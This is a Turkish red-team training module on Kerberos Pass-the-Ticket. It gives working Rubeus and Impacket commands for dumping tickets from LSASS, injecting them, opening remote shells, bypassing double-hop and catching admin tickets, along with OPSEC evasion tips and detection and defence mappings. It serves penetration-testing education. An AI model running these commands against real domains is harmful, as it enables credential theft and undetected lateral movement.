## 1. Genel Bakış ve Mimari

Kerberos bilet tabanlı bir kimlik doğrulama protokolüdür. Kullanıcı kimliğini bir kez etki alanı denetleyicisine kanıtladıktan sonra, eline **taşınabilir kriptografik biletler (TGT / TGS)** verilir. Kerberos protokolünün en kritik tasarım özelliklerinden biri şudur:
> **Kerberos biletleri varsayılan olarak istemcinin IP adresine veya donanımına kilitlenmez.**

Bir kurban sistemin belleğinden (LSASS) çalınan geçerli bir bilet, saldırganın kendi oturumuna enjekte edildiğinde işletim sistemi saldırganı o biletin meşru sahibi kabul eder. Buna **Pass-the-Ticket (PtT)** denir:

```
[ Kurban Sunucu (SRV01) ] ──(LSASS Dump / sekurlsa::tickets)──► [ Çalınan TGT (.kirbi) ]
                                                                       │
                                                       (ticketConverter.py)
                                                                       ▼
[ Saldırgan Makinesi (Linux) ] ◄── export KRB5CCNAME ─────────── [ .ccache Dosyası ]
              │
              ├── (1) TGS Talebi (Hedef: CIFS/DC01) ──► [ Domain Controller ]
              │   (Bilet içindeki imzalı PAC doğrulanır)        │
              │                                                │
              └── (2) Meşru Kerberos Erişimi ──────────────────┘
                  (NTLM YOK! Sadece Saf Kerberos 4624)
```

Pass-the-Ticket saldırısı, Pass-the-Hash'e (PtH) göre çok daha yüksek operasyonel gizlilik (OPSEC) sağlar:
1. Ağda hiçbir şekilde şüpheli **NTLM (Logon Type 3 NTLMSSP)** trafiği oluşturmaz.
2. TGT içindeki PAC (Privilege Attribute Certificate) KDC tarafından meşru olarak imzalanmıştır; sahte biletlerde (Golden Ticket) görülen imza ve zaman anomalileri bulunmaz.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 Bilet Türleri ve Format Ayrımı
* **TGT (Ticket Granting Ticket):** `krbtgt` hesabı tarafından şifrelenmiştir. Saldırgana herhangi bir etki alanı servisi için yeni Hizmet Biletleri (TGS) talep etme yetkisi verir (Tam Kimlik).
* **TGS (Service Ticket):** Belirli bir servis hesabının (`MSSQLSvc`, `cifs`, `HOST`) anahtarıyla şifrelenmiştir. Yalnızca o spesifik servise erişim sağlar; başka sistemlere yanal hareket için kullanılamaz.
* **Format Dönüşümleri:**
  * **`.kirbi` (Windows):** Mimikatz ve Rubeus tarafından kullanılan `KRB_CRED` (RFC 4120) ikili yapısıdır.
  * **`.ccache` (Linux):** MIT Kerberos ve Impacket tarafından kullanılan Credential Cache dosyasıdır.
  * İki format arasında kayıpsız çevrim `impacket-ticketConverter` ile yapılır.

### 2.2 Kerberos Double-Hop Problemi ve Çözüm Mekanizmaları
Uzak yönetimde (PowerShell Remoting / WinRM, WMI) en sık karşılaşılan engel **Kerberos Double-Hop (Çift Sıçrama)** kısıtlamasıdır:

```
[ Saldırgan ] ──(1. Hop: WinRM / Kerberos)──► [ Host A ] ──(2. Hop: Access Denied!)──► [ Host B (File Share) ]
                                                   │
                                     (Host A kullanıcının TGT'sine
                                      sahip değildir; bilet devredilemez!)
```

Saldırgan Host A'ya uzaktan bağlandığında, kimlik doğrulama Host A'da sonlanır. Host A, kullanıcının TGT'sini taşımadığı için Host B'ye kullanıcı adına bağlanamaz (`0x8009030e SEC_E_NO_CREDENTIALS`).

**Kırmızı Takım Çözümleri:**
1. **Rubeus `tgtdeleg` Hilesi:** GSS-API Kerberos delege etme mekanizmasını (`KERB_ETYPE_RC4_HMAC_NT`) istismar ederek, hedef makinede yerel admin olmadan oturum açmış kullanıcının **yeniden kullanılabilir TGT'sini** çıkarır ve yerel oturuma enjekte eder.
2. **CredSSP (Credential Security Support Provider):** Kimlik doğrulama sırlarının açık metin olarak ikinci sunucuya aktarılmasını sağlar (`Enable-WSManCredSSP`).
3. **Resource-Based Constrained Delegation (RBCD):** Host A'ya Host B adına delege olma izni vererek S4U2Proxy üzerinden bilet türetilir ([Modül 06.3](../Modul_06_Kerberos_Delegation_Saldirilari/06.3_Resource_Based_Constrained_Delegation.md)).

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Windows Üzerinde Rubeus ile Bilet Dökümü ve Enjeksiyonu

```powershell
# 1. Bellekteki mevcut biletleri listeleme (Triage)
.\Rubeus.exe triage

# 2. Yüksek yetkili bir kullanıcının biletini bellekten çekme (.kirbi base64)
.\Rubeus.exe dump /user:Administrator /nowrap

# 3. Elde edilen bileti geçerli komut satırı oturumuna enjekte etme (PtT)
.\Rubeus.exe ptt /ticket:doIFqjCCBaagAwIBBaEDAgEW...

# 4. Enjekte edilen bilet ile etki alanı denetleyicisine bağlanma
dir \\DC01.corp.local\C$
```

---

### Senaryo 2: Linux Üzerinde Impacket ile Bilet Çevrimi ve Yanal Hareket

```bash
# 1. Windows .kirbi dosyasını Linux uyumlu .ccache formatına dönüştürme
impacket-ticketConverter administrator.kirbi administrator.ccache

# 2. Bilet dosyasını çevre değişkeni olarak tanımlama
export KRB5CCNAME=$(pwd)/administrator.ccache

# 3. Bilet üzerinden parola girmeden (-k -no-pass) uzak sunucuda komut çalıştırma
impacket-wmiexec -k -no-pass corp.local/administrator@srv01.corp.local

# 4. NetExec ile Kerberos biletli tarama
nxc smb srv01.corp.local -k --use-kcache
```

---

### Senaryo 3: Rubeus `tgtdeleg` ile Double-Hop Kısıtlamasını Aşma

```powershell
# 1. Uzak WinRM oturumunda yerel admin olmadan kullanıcının TGT'sini talep etme
.\Rubeus.exe tgtdeleg /nowrap

# 2. Dönen TGT biletini aynı oturuma enjekte etme
.\Rubeus.exe ptt /ticket:<BASE64_TGT>

# 3. İkinci sıçramayı (Double-Hop) gerçekleştirme
Get-ChildItem \\DC01.corp.local\SYSVOL
```

---

### Senaryo 4: Rubeus Monitor ile Arka Planda TGT Avcılığı (Oturum Bekleme)

```powershell
# Sistemde oturum açacak Domain Admin veya yüksek yetkili hesapların TGT'lerini yakalamak için izleme başlatma
.\Rubeus.exe monitor /interval:5 /targetuser:Administrator /nowrap
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `KRB_AP_ERR_TKT_EXPIRED (0x20)` | Çalınan TGT biletinin geçerlilik süresi (`End Time`) dolmuştur (varsayılan: 10 saat). | `klist` ile bilet süresini kontrol edin; süresi dolmuş bilet yenilenemez, yeni bilet çalın veya Overpass yapın. |
| `KRB_AP_ERR_BAD_INTEGRITY (0x1f)` | Biletin oturum anahtarı (Session Key) ile enjekte edilen bilet uyumsuzdur veya bilet bozulmuştur. | Base64 kopyalama hatasını kontrol edin; bilet dosyasını `ticketConverter` ile yeniden üretin. |
| `WinRM Double-Hop: Access is Denied (0x8009030e)` | WinRM oturumu kullanıcının biletini ikinci sunucuya aktaramamaktadır. | Rubeus `tgtdeleg` çalıştırıp bilet enjekte edin veya CredSSP / RBCD yöntemlerini kullanın. |
| `Kerberos: Hostname resolution mismatch` | Bilet IP adresi için değil FQDN için üretilmiştir; IP ile bağlanmaya çalışıldığında KDC bilet vermez. | IP adresi yerine mutlaka FQDN kullanın: `smb://dc01.corp.local` (Asla `smb://10.10.10.5` değil). |
| `klist purge failed / Old tickets interfering` | Bellekteki eski süresi dolmuş biletler yeni enjekte edilen biletle çakışmaktadır. | `klist purge` komutuyla önbelleği temizleyip bileti yeniden enjekte edin. |
| `KRB5CCNAME: Permission Denied on Linux` | Linux üzerinde ccache dosyasının dosya izinleri yetersizdir. | `chmod 600 ticket.ccache` komutu ile izinleri düzenleyin. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Windows Security Event ID 4624 (Logon Type 3 - Network):**
  * `AuthenticationPackageName`: `Kerberos`
  * `Logon Process Name`: `Kerberos` (NTLM içermeyen temiz oturum).
* **Security Event ID 4769 (Kerberos Service Ticket Operations):**
  * Çalınan TGT ile yeni bir servis bileti istendiğinde KDC üzerinde loglanır.
* **Sysmon Event ID 10 (ProcessAccess to LSASS):**
  * Biletler bellekten çalınırken (`sekurlsa::tickets` veya `Rubeus dump`) LSASS handle'ı açılır.

### 5.2 Ağ ve EDR İmzaları
* **TGT Kaynak Anomalisi:** Normalde muhasebe departmanındaki bir istemciden gelmesi beklenen bir biletin, IT yönetim sunucusundan veya Linux makineden kullanılması UEBA kuralları tarafından algılanır.
* `klist purge` komutunun peş peşe çalıştırılması şüpheli operasyonel aktivite sayılır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |

| **[T1558](https://attack.mitre.org/techniques/T1558/)** | Steal or Forge Kerberos Tickets | Bellekten bilet çalma ve bilet manipülasyonu. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |

| Süresi dolmuş biletle sorgu atmak | Biletin `End Time` süresini sürekli denetleyin; süre dolmadan oturumu kapatın. | Kerberos bilet geçerlilik sürelerini (User ticket lifetime) 10 saatten 4 saate indirin. |
| Eşzamanlı farklı IP'lerden TGT kullanımı | Çalınan bileti yalnızca tek bir sıçrama noktasından işletin. | SIEM üzerinde tek bir TGT'nin kısa sürede birden fazla farklı IP'den TGS istemesini alarmlayın. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```bash
# 1. Bilet Formatı Çevrimi (.kirbi -> .ccache)
impacket-ticketConverter ticket.kirbi ticket.ccache
# Ne Yapar?: Windows Rubeus/Mimikatz biletini Linux Impacket/nxc uyumlu formata çevirir.
# Ne Zaman Kullanılır?: Windows hosttan çalınan bilet Linux saldırı makinesine taşındığında.

# 2. Linux Ortamında Bilet ile Uzak Kabuk Açma (wmiexec)
export KRB5CCNAME=ticket.ccache && impacket-wmiexec -k -no-pass corp.local/admin@srv01.corp.local
# Ne Yapar?: Parola girmeden saf Kerberos biletiyle WMI üzerinden komut satırı açar.
# Ne Zaman Kullanılır?: NTLM izi bırakmadan hedef sunucuya sıçramak için.

# 3. Windows'ta Rubeus ile Bilet Enjeksiyonu (/ptt)
Rubeus.exe ptt /ticket:ticket.kirbi
# Ne Yapar?: Belirtilen bileti geçerli LSA oturumuna yükler; ağ komutlarının o kimlikle gitmesini sağlar.
# Ne Zaman Kullanılır?: Windows üzerinde yetkili bir Kerberos bileti ele geçtiğinde.

# 4. Rubeus tgtdeleg ile WinRM Double-Hop Baypas
Rubeus.exe tgtdeleg /nowrap
# Ne Yapar?: Yönetici yetkisi olmadan geçerli oturumun yeniden kullanılabilir TGT'sini çıkarır.
# Ne Zaman Kullanılır?: PowerShell remoting oturumunda ikinci bir sunucuya erişim engellendiğinde.

# 5. NetExec ile Kerberos Biletli SMB Doğrulaması
nxc smb dc01.corp.local -k --use-kcache
# Ne Yapar?: KRB5CCNAME ortamındaki bileti kullanarak hedef sunucuda yetkileri denetler.
# Ne Zaman Kullanılır?: Biletin geçerliliğini ve hedefteki adminlik durumunu hızlıca teyit etmek için.

# 6. Windows Bilet Önbelleğini Temizleme (klist purge)
klist purge
# Ne Yapar?: Bellekteki tüm oturum biletlerini siler; yeni bilet enjeksiyonuna temiz alan açar.
# Ne Zaman Kullanılır?: Süresi dolmuş biletlerin yeni biletlerle çakışmasını engellemek için.
```
